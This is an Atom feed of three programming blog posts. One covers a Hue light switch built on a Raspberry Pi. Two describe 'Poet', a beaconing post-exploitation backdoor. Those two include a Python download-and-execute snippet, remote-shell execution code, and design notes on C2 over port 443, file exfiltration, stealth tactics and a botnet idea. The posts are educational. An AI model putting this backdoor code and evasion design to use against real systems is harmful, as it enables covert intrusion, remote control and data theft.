<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Programming | Mark Mossberg's Blog]]></title>
  <link href="http://blog.mark.lc/blog/categories/programming/atom.xml" rel="self"/>
  <link href="http://blog.mark.lc/"/>
  <updated>2015-07-12T13:48:47-04:00</updated>
  <id>http://blog.mark.lc/</id>
  <author>
    <name><![CDATA[Mark Mossberg]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Off to the (Python Internals) Races]]></title>
    <link href="http://blog.mark.lc/blog/2015/06/07/off-to-the-python-internals-races/"/>
    <updated>2015-06-07T00:00:00-04:00</updated>
    <id>http://blog.mark.lc/blog/2015/06/07/off-to-the-python-internals-races</id>
    <content type="html"><![CDATA[<p>This post is about an interesting race condition bug I ran into when working
on a small feature improvement for
<a href="http://github.com/mossberg/poet">poet</a> a while ago
that I thought was
worth writing a blog post about.</p>

<p>In particular, I was improving the download-and-execute capability of poet
which, if you couldn&rsquo;t tell, downloads a file from the internet and executes
it on the target. At the original time of writing, I didn&rsquo;t know about
the python <code>tempfile</code> module and since I recently learned about it, I wanted
to integrate it into poet as it would be a significant improvement to
the original implementation. The initial patch looked like this.</p>

<pre><code class="python">r = urllib2.urlopen(inp.split()[1])
with tempfile.NamedTemporaryFile() as f:
    f.write(r.read())
    os.fchmod(f.fileno(), stat.S_IRWXU)
    f.flush()  # ensure that file was actually written to disk
    sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
</code></pre>

<p>This code downloads a file from the internet, writes it to a tempfile on
disk, sets the permissions to executable, executes it in a subprocess.
In testing this code, I observed some puzzling behavior: the file was
never actually getting executed because it was suddenly ceasing to
exist! I noticed though that when I used
<code>subprocess.call()</code> or used <code>.wait()</code> on the <code>Popen()</code>, it would work
fine, however I intentionally didn&rsquo;t want the client to block while the
file executed its arbitrary payload, so I couldn&rsquo;t use those functions.</p>

<p>The fact that the execution would work when the <code>Popen</code> call waited for
the process and didn&rsquo;t work otherwise suggests that there was something
going on between the time it took to execute the child and the time it took
for the <code>with</code> block to end and delete the file, which is <code>tempfile</code>&rsquo;s
default behavior. More specifically, the
file must have been deleted at some point before the <code>exec</code> syscall loaded
the file from disk into memory. Let&rsquo;s take a look at the implementation of
<code>subprocess.Popen()</code> to see if we can gain some more insight:</p>

<pre><code class="python">def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell, to_close,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            &lt;snip&gt;

            try:
                try:
                    &lt;snip&gt;
                    try:
                        self.pid = os.fork()
                    except:
                        if gc_was_enabled:
                            gc.enable()
                        raise
                    self._child_created = True
                    if self.pid == 0:
                        # Child
                        try:
                            # Close parent's pipe ends
                            if p2cwrite is not None:
                                os.close(p2cwrite)
                            if c2pread is not None:
                                os.close(c2pread)
                            if errread is not None:
                                os.close(errread)
                            os.close(errpipe_read)

                            # When duping fds, if there arises a situation
                            # where one of the fds is either 0, 1 or 2, it
                            # is possible that it is overwritten (#12607).
                            if c2pwrite == 0:
                                c2pwrite = os.dup(c2pwrite)
                            if errwrite == 0 or errwrite == 1:
                                errwrite = os.dup(errwrite)

                            # Dup fds for child
                            def _dup2(a, b):
                                # dup2() removes the CLOEXEC flag but
                                # we must do it ourselves if dup2()
                                # would be a no-op (issue #10806).
                                if a == b:
                                    self._set_cloexec_flag(a, False)
                                elif a is not None:
                                    os.dup2(a, b)
                            _dup2(p2cread, 0)
                            _dup2(c2pwrite, 1)
                            _dup2(errwrite, 2)

                            # Close pipe fds.  Make sure we don't close the
                            # same fd more than once, or standard fds.
                            closed = { None }
                            for fd in [p2cread, c2pwrite, errwrite]:
                                if fd not in closed and fd &gt; 2:
                                    os.close(fd)
                                    closed.add(fd)

                            if cwd is not None:
                                os.chdir(cwd)

                            if preexec_fn:
                                preexec_fn()

                            # Close all other fds, if asked for - after
                            # preexec_fn(), which may open FDs.
                            if close_fds:
                                self._close_fds(but=errpipe_write)

                            if env is None:
                                os.execvp(executable, args)
                            else:
                                os.execvpe(executable, args, env)

                        except:
                            exc_type, exc_value, tb = sys.exc_info()
                            # Save the traceback and attach it to the exception object
                            exc_lines = traceback.format_exception(exc_type,
                                                                   exc_value,
                                                                   tb)
                            exc_value.child_traceback = ''.join(exc_lines)
                            os.write(errpipe_write, pickle.dumps(exc_value))

                        # This exitcode won't be reported to applications, so it
                        # really doesn't matter what we return.
                        os._exit(255)

                    # Parent
                    if gc_was_enabled:
                        gc.enable()
                finally:
                    # be sure the FD is closed no matter what
                    os.close(errpipe_write)

                # Wait for exec to fail or succeed; possibly raising exception
                # Exception limited to 1M
                data = _eintr_retry_call(os.read, errpipe_read, 1048576)

                &lt;snip&gt;
</code></pre>

<p>The <code>_execute_child()</code> function is called by the <code>subprocess.Popen</code> class
constructor and implements child process execution. There&rsquo;s a lot of
code here, but key parts to notice here are the <code>os.fork()</code> call which
creates the child process, and the relative lengths of the following
<code>if</code> blocks. The check <code>if self.pid == 0</code> contains the code for executing
the child process and is significantly more involved than the code
for handling the parent process.</p>

<p>From this, we can deduce that when the <code>subprocess.Popen()</code> call executes
in my code, after forking, while the child is preparing to call
<code>os.execve</code>, the parent simply returns, and immediately exits the <code>with</code>
block. This automatically invokes the <code>f.close()</code> function which deletes
the temp file. By the time the child calls <code>os.execve</code>, the file has been
deleted on disk. Oops.</p>

<p>I fixed this by adding the <code>delete=False</code> argument to the
<code>NamedTemporaryFile</code> constructor to suppress the auto-delete functionality.
Of course this means that the downloaded files will have to be cleaned up
manually, but this allows the client to not block when executing the file
and have the code still be pretty clean.</p>

<p>Main takeaway here: don&rsquo;t try to <code>Popen</code> a <code>NamedTemporaryFile</code> as the
last statement in the tempfile&rsquo;s <code>with</code> block.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building a Simple IoT Light Switch]]></title>
    <link href="http://blog.mark.lc/blog/2015/01/18/a-simple-iot-light-switch/"/>
    <updated>2015-01-18T13:32:48-05:00</updated>
    <id>http://blog.mark.lc/blog/2015/01/18/a-simple-iot-light-switch</id>
    <content type="html"><![CDATA[<p>I&rsquo;m lucky enough to own a <a href="http://www.meethue.com">Philips Hue</a> wireless
lighting unit (thanks <a href="http://acm.ccs.neu.edu">NUACM</a>!) which essentially is
this really awesome Internet of Things (IoT) product that lets me replace
all my standard light bulbs with special RGB ones that can be controlled
wirelessly. The bulbs communicate via
<a href="http://en.wikipedia.org/wiki/ZigBee">ZigBee</a> with a &ldquo;Bridge&rdquo; unit that
is connected to my local network and hosts an HTTP API for interfacing
with the lights. This API is used by the official Hue mobile app for controlling
the lights, but is also publicly documented and totally hacker friendly.
The lights are awesome, but it is a bit of a drag to have to use an app
to turn them all off rather than having some physical switch <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, so I decided
to fully embrace the IoT trend and use my Raspberry Pi to build a simple
HTTP-fluent light switch for turning my lights on and off.</p>

<h3>Hardware</h3>

<p>The circuitry itself is literally as simple as it gets for this kind of thing,
all I have is GPIO pin 11 on the board (BCM pin 17) connected to pin 6 (GND),
with a switch in between. In my code, I&rsquo;ll configure pin 17 to use an internal
pull up resistor which will bring the voltage up to 3.3V when the button is not
pressed and down to 0V when it is.</p>

<p><img src="/images/rpi.jpg" alt="" /></p>

<h3>Software</h3>

<p>The Raspberry Pi Python library makes it really easy to control circuits. For
simplicity, my code uses a polling approach to detect when the button is pressed
but the RPi library also supports real callbacks using threading.</p>

<pre><code class="python">def main():
    while True:
        inp = gpio.input(PIN)
        # pull up resistor will cause inp to be True when button is not
        # pressed and False when button is pressed
        if not inp:
            callback()
        time.sleep(BUTTON_SLEEP)
</code></pre>

<p>My <code>callback()</code> function consists of code that uses the Hue API to request
a diagnostic of the lights, which comes back as a JSON blob with each light
represented as an object. If no lights are on, it turns them on, otherwise
turning them all off. Turning the lights on and off is as simple as submitting
a PUT request to the API endpoint for each light with a JSON blob specifying
the state to turn to (On=True, Off=False).</p>

<pre><code class="python">def callback():
    survey = requests.get(BASE + '/lights')
    survey = json.loads(survey.text)
    numlights = len(survey)
    # if any are on, turn all off.
    if any([survey[str(x)]['state']['on'] for x in range(1, numlights+1)]):
        for light in survey.keys():
            turn(light, False)
        print '[{}] Off'.format(datetime.datetime.now())
    else:  # else if all are off, then all on
        for light in survey.keys():
            turn(light, True)
        print '[{}] On'.format(datetime.datetime.now())


def turn(light, state):
    data = json.dumps({'on':state})
    requests.put(BASE + '/lights/{}/state'.format(light), data=data)
</code></pre>

<p>That&rsquo;s it! I leave the script running in a tmux pane on the Pi and I can
hit the button at any point to toggle the lights on and off. The full code
is available on <a href="https://github.com/mossberg/raspi/blob/master/hue.py">github</a>.</p>

<p>For future work,
it would be cool to integrate RF chips so the button wouldn&rsquo;t have to be
physically attached to the Pi and I could have a little remote control. I&rsquo;ll
leave that for another day. Thanks for reading, here it is in action!</p>

<blockquote class="instagram-media" data-instgrm-version="4" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAAGFBMVEUiIiI9PT0eHh4gIB4hIBkcHBwcHBwcHBydr+JQAAAACHRSTlMABA4YHyQsM5jtaMwAAADfSURBVDjL7ZVBEgMhCAQBAf//42xcNbpAqakcM0ftUmFAAIBE81IqBJdS3lS6zs3bIpB9WED3YYXFPmHRfT8sgyrCP1x8uEUxLMzNWElFOYCV6mHWWwMzdPEKHlhLw7NWJqkHc4uIZphavDzA2JPzUDsBZziNae2S6owH8xPmX8G7zzgKEOPUoYHvGz1TBCxMkd3kwNVbU0gKHkx+iZILf77IofhrY1nYFnB/lQPb79drWOyJVa/DAvg9B/rLB4cC+Nqgdz/TvBbBnr6GBReqn/nRmDgaQEej7WhonozjF+Y2I/fZou/qAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://instagram.com/p/yAhhmMn8yt/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_top">A video posted by Mark Mossberg (@mssbrg)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2015-01-18T20:09:40+00:00">Jan 18, 2015 at 12:09pm PST</time></p></div></blockquote>


<script async defer src="//platform.instagram.com/en_US/embeds.js"></script>



<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course I could physically go to each light and flip the switch but manually turning off all three lights in my room is even more work than launching the app.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Poet: Beacon Based Post-Exploitation]]></title>
    <link href="http://blog.mark.lc/blog/2014/12/13/poet-beacon-based-post-exploitation/"/>
    <updated>2014-12-13T02:38:31-05:00</updated>
    <id>http://blog.mark.lc/blog/2014/12/13/poet-beacon-based-post-exploitation</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>For the past eight months or so, I&rsquo;ve been working sporadically on a side
project of mine I call <a href="http://github.com/mossberg/poet">Poet</a>. Poet is
basically a tool for hackers that&rsquo;s useful for post exploitation, that is,
<em>after</em> you&rsquo;ve initially exploited and gotten access to the computer you&rsquo;re
not supposed to have access to. Poet is useful because it essentially acts as
a backdoor you can install into a system to help you maintain access once
you&rsquo;ve gotten your foot in the door.</p>

<p>As a disclaimer, I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others interested
in learning about this sort of thing. Use it responsibly.</p>

<p>I&rsquo;ve learned a lot during the process of
building this tool and I thought it would be cool to write a blog post (possibly
more to come)
documenting that process.</p>

<h3>Motivation</h3>

<p>The initial motivation for this project came from an experience I had
participating in the 2014 Northeast Collegiate Cyber Defense Competition. In
short, the competition requires a team of students to protect a small
business IT infrastructure from a red team of hackers. Usually the red team
is really good and completely owns you at some point or other throughout
the competition, and at the end they tell you what they did and give
you tips on how to improve. In particular, the red team told us that there
was pre-installed &ldquo;beaconing&rdquo; malware on many of our systems from the start
of the competition that would &ldquo;phone home&rdquo; to a command and control (C2) server
every once in a while to get commands and tasks to execute on the target
system. This idea was pretty interesting to me, and a basic implementation
didn&rsquo;t actually seem <em>too</em> hard to write, so I decided to give it a try, even
though at this point, I had no experience with network programming.</p>

<h3>v0.1</h3>

<p>The first version of Poet was drastically different from the current form
and was just about as simple and primitive as it gets for something
like this. In this version, the client program (executed on target) would
repeatedly attempt to connect to a socket (port 80 by default) on the server (attacker&rsquo;s C2 server)
at a specified interval. If the connection failed (server
wasn&rsquo;t running), the client would sleep, otherwise it would execute
a command sent from the server, sending back the stdout of the command.
The
server simply maintained a queue of commands to execute and would one
by one pop them off the queue and send them to the client, printing out the stdout
when it came back.
This was a great exercise
to learn the basics of socket programming, but of course
wasn&rsquo;t very useful at all, for a number of reasons. First, ideally the client&rsquo;s
interval is very large so as to minimize network use and
remain stealthy but that puts a hard limit on the rate at which
commands can be executed. This system was also very inflexible because there
was no way to reorder or edit commands in the queue, since the &ldquo;user
interface&rdquo; was just a server script that was run with the commands to execute
as arguments. Overall, a good start,
but there was definitely much work ahead to actually make this a semi-realistic tool.</p>

<h3>v0.2</h3>

<p>The second version of Poet involved a pretty substantial redesign although
one of the things to stay the same would be the high
level client/server beaconing dynamic. This is far superior than having the
client attempt to listen on the target&rsquo;s end because in any sort of &ldquo;real&rdquo;
scenario, the target will likely be behind a firewall that will reject
incoming packets on arbitrary ports.
The beaconing model will allow the tool
to bypass most standard firewalls that aren&rsquo;t specifically targeting it because
outbound port 80 traffic is almost certainly
allowed. I later changed the default port to 443 because it&rsquo;s just as
likely to be allowed out and because it could potentially avoid packet inspection,
since traffic on 443 is usually encrypted.</p>

<p>Building on top of this model, there were a couple other brainstorms I had
to build on top of v0.1. Instead of executing a single command for every ping,
what about sending over multiple commands? What about a pastebin/gist URL to
a script that the client
would download and execute? These would help solve the rate limit problem
because an arbitrary number of commands, instead of one, could be executed
for each ping. What about user interface?
What about creating an actual web user interface
for managing the command queue that the client was pulling from each ping?
This would help solve the flexibility problem.</p>

<p>While these would be relatively simple to add to v0.1,
if I asked myself, &ldquo;If I were a hacker, would I
want to use this tool?&rdquo; the answer would be &ldquo;No way!&rdquo; because I would only be able
to interact with my target system via discrete scripts, and I
would have to wait the ideally large time interval between pings to
get any sort of feedback on my actions.</p>

<p>This made it obvious that I would have to move
from a design where each ping from the client was an opportunity for the
user to run <em>x</em> actions on the target,
to a design where each ping from
the client was an opportunity for the user to interactively control the client
for an unlimited time,
and perform actions on the target with continuous feedback.
With this in mind, I opted to use a shell as the user interface on the server
side since it seemed simpler to implement and I was more familiar with
implementing a shell versus something like a web interface (which would
likely have to have a shell built into it anyway for executing commands).
The server design would be similar to that of v0.1 in that the server would
only be running when the user wanted to control the client, and the client
would use the inability to connect to the server as an sign to &ldquo;go to sleep&rdquo;
for another interval, although this isn&rsquo;t strictly necessary. Another server design
I thought of would be an always-on model where the server would always answer
the client&rsquo;s ping with some kind of binary state value, which would work equally
well, but wouldn&rsquo;t be strictly necessary because state can be inferred as
described above.</p>

<p>In designing the actual protocol the client
and server use to communicate, I decided to
use HTTP to mildly obfuscate the client&rsquo;s initial check if
the server is running. The client&rsquo;s ping consists of a
GET request for <code>/style.css</code> on the server <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Of course, the server isn&rsquo;t
a real web server, but it temporarily masquerades as one for the purposes of
the initial handshake and sends back a hardcoded HTTP response of some random
css file, and launches the control shell for the user. At this point, the
protocol used is as simple as it gets: size of the following data + the data
itself. This being my first time doing socket programming, my implementation
was a little weird and reserved the first five bytes of the data sent over the
wire for the ASCII decimal representation of the size (<code>¯\_(ツ)_/¯</code>), but
hey, it worked.</p>

<p>The majority of the work left for v0.2 was essentially deciding on the features
that the control shell would have and implementing the &ldquo;userland utilities&rdquo;
or commands you could run at the shell. The commands I thought of and implemented
were:</p>

<ul>
<li><code>exec</code>: This was the first command I wrote. It executes one or more commands on
the target, sending the stdout of all of them back in one big chunk of text. I later
added a flag that would save the big chunk to a file in the archive directory.
Useful for stuff like grabbing process dumps.</li>
<li><code>recon</code>: Basically like <code>exec</code>, but the commands are pre-selected and are tailored
towards &ldquo;reconnaissance&rdquo; purposes. Stuff like <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>w</code>, etc.</li>
<li><code>shell</code>: Launches an actual remote shell on the target (inside the original
control shell). Was implemented
really crudely in this version with the execution backend on the client simply
being something like</li>
</ul>


<pre><code class="python">subprocess.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True).communicate()[0]
</code></pre>

<ul>
<li><code>exfil</code>: Exfiltrate files and saves to the archive directory. Pretty standard.
Current implementation is pretty crude, and loads entire file into memory, rather
than paging the data somehow.</li>
<li><code>selfdestruct</code>: Exit the client and delete script on disk. Without this,
the user would have to do something weird (nay, treasonous?) like
killing the client&rsquo;s process from its own remote shell to completely
turn off the client.</li>
<li><code>dlexec</code>: Download an executable from the internet and execute it. Also
pretty standard, useful for upgrading or installing additional tools on target</li>
<li><code>exit</code>: Pretty self explanatory, this tells the client that the server&rsquo;s
done for now and that the client can now go back to sleep and begin pinging
again in one time interval.</li>
</ul>


<p>This work resulted in a decently functional prototype that could feasibly
be used for post-exploitation.</p>

<h3>v0.3</h3>

<p>Version 0.3 was a pretty arbitrary decision, but mostly involved significant
refactoring of the backend code, with a couple new user facing features.
One notable change was the refactoring of the entire codebase from imperative,
C-style programming to object oriented style, which gave the code much better
structure. The communications protocol was also slightly refactored to be
more standard by reserving the first four bytes for
the binary data size value which simultaneously conserved
bytes sent over the wire and increased the maximum data that could be sent in
one message between client and server. An additional shell command I implemented
was called <code>chint</code>, standing for &ldquo;change interval&rdquo;, which lets the server
change the client&rsquo;s ping delay interval after the client&rsquo;s been started.</p>

<p>All that&rsquo;s great, but the most significant set of improvements in my opinion
were related to fleshing out the remote shell feature. While it &ldquo;worked&rdquo;
to a decent degree for most standard commands there were two main problems with
it that kept it from being a &ldquo;real&rdquo; shell. For reference, here&rsquo;s what the code
looked like for executing commands in v0.2.</p>

<pre><code class="python">def cmd_exec(cmd):
    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                    shell=True).communicate()[0]
</code></pre>

<p>For those that aren&rsquo;t as familiar with Python&rsquo;s <code>subprocess</code> library, this
executes an arbitrary command line (<code>cmd</code>), sending the stderr to the stdout,
and returns any stdout of the command.</p>

<p>The first problem was that the shell
output was not continuous &ndash; when executing a command like <code>ls -R /</code>, which
typically results in lots of scrolling output in a normal terminal, my remote
shell would instead block on the server end while the client executed the
command to its completion and sent over the entire stdout as one big piece.
I solved this problem by adapting the code to continuously poll the
stdout file descriptor for new lines of output, sending those over individually
so that the server would get each line of output as soon as it was available.</p>

<p>The second problem was that if certain commands like <code>ping</code> were executed in the shell,
the client would effectively become unusable because <code>ping</code> (when executed
without the <code>-c</code> parameter) is usually ended by being sent a INT signal (SIGINT),
typically by hitting Ctrl-C on the keyboard. The problem is, the client side
had no mechanism to receive signals and send them to the running process, so
it would be eternally running this unending process and the user
would totally lose control of the target. To solve this problem, I needed a way for the
client to simultaneously execute the requested command, <strong>and</strong> listen for
messages from the server, presumably telling the client to end the running
process. To do this, I learned to use the <code>select()</code> function which is an
easy way for an application to multiplex data streams (in this case,
the stdout of the running process, and the socket connection to the server)
and process their data without requiring concurrency at the application
level.</p>

<p>The resulting code from these two fixes is below. Select takes in multiple
file descriptors (File objects in Python) and returns which ones
are readable (in this example). After it returns, I can check which file descriptors
it returned, and proceed accordingly. In the expected case where
we can read from the process&rsquo;s stdout file descriptor, we get a line of
stdout from the process, forwarding it to the server immediately.
In the exceptional case where we can read from the socket, we receive the message,
making sure it contains the proper keyword to end the process (&lsquo;shellterm&rsquo;)
and terminating the process if it does.</p>

<pre><code class="python">proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
while True:
    readable = select.select([proc.stdout, s.s], [], [], 30)[0]
    for fd in readable:
        if fd == proc.stdout:  # proc has stdout/err to send
            output = proc.stdout.readline()
            if output:
                s.send(output)
            else:
                return
        elif fd == s.s:  # remote signal from server
            sig = s.recv()
            if sig == 'shellterm':
                proc.terminate()
                return
</code></pre>

<p>That&rsquo;s all for v0.3. Again, the v0.3 decision was pretty arbitrary and I ultimately
chose to ship it because all the other features I had lined up at
the time were
more labor intensive/experimental and I <em>really</em> wanted to get my fancy
new remote shell into master :D.</p>

<h3>Future Work</h3>

<p>At this point, I&rsquo;m pretty satisfied with the state of the project, but as
always, there&rsquo;s more work to be done. Here are some future features/ideas/improvements
that may or may not ever get implemented:</p>

<ul>
<li><strong>crypto</strong>: If anything, I&rsquo;d say encrypted communications are the one thing
keeping this from being a really usable tool. Right now, communications are
sent in the clear essentially, although they are base64 encoded for the slightest
amount of obfuscation. Ideally I&rsquo;d use Python&rsquo;s ssl library, probably doing
something like hardcoding a server public key into the client. A solution
that wouldn&rsquo;t be as much work, but only slightly more secure than the current
cleartext communications would be to use a basic xor cipher which would be
pretty easy to write, and force an analyst to retrieve the key from memory,
or the initial exchange over the network, depending on how I chose to implement it.</li>
<li><strong>protocol improvement</strong>: This shouldn&rsquo;t actually be too hard to implement,
but the data section of a poet message is typically some type of keyword, a space,
then any relevant data. For example, to start a shell, the server sends
over &ldquo;shell&rdquo;, to get recon data, the server sends &ldquo;recon&rdquo;, for an <code>exec</code>
command, the server sends over &ldquo;exec&rdquo; followed by the commands to execute.
Instead of using these string keywords, it would be possible to move them into
the protocol as a single byte after the data size and have some sort
of lookup table for referencing the appropriate action to each key.</li>
<li><strong>interval fuzzing</strong>: Instead of having a strict, predictable delay time
interval for client pings, I could implement some sort of fuzzing so that the delay
time is slightly variable for further obfuscation
purposes.</li>
</ul>


<p>and last, but not least&hellip;</p>

<ul>
<li><strong>botnet</strong>(?!): Now that I more or less have the infrastructure down for
controlling a single client, it would be pretty cool to
fork the project and adapt it for a more distributed design with multiple
clients connecting to the server, all receiving commands to execute.</li>
</ul>


<hr />

<p>Again, all the code for this project is available on <a href="http://github.com/mossberg/poet">github</a>.
Hopefully this was interesting/helpful for some people, and as always thanks for reading!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Writing this post and thinking about this again actually helped me discover a bug in the server where the server would terminate if it happened to receive a non-client HTTP request while waiting for the client. This would enable a third party that wanted to mess with the Poet user to spam the Poet user&rsquo;s machine with HTTP requests (assuming they knew the proper port to send to) at any interval smaller than the Poet interval, and effectively DOS Poet.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
</feed>
